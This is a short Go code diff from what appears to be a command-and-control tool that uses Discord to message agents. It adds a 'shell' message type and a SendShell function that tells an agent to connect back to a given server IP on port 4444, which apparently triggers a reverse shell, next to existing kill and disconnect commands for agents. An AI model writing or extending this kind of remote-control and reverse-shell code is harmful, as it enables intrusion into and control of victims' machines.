@@ -19,6 +19,7 @@ const (
 	MESSAGE_KILL Type = iota
 	MESSAGE_DISCONNECT Type = iota
 	MESSAGE_RECONNECT Type = iota
+	MESSAGE_SHELL Type = iota
 )
 
 type Message struct {
@@ -74,5 +75,10 @@ func Pong(dg *discordgo.Session, agentID string, fromServer bool){
 
 func KillAgent(dg *discordgo.Session, agentID string) {
 	message := NewMessage(agentID, "", true,false, MESSAGE_KILL)
+	dg.ChannelMessageSend(constants.ChannelID, message)
+}
+
+func SendShell(dg *discordgo.Session, agentID string, serverIP string){
+	message := NewMessage(agentID, serverIP + ":4444", true,false, MESSAGE_SHELL)
 	dg.ChannelMessageSend(constants.ChannelID, message)
 }
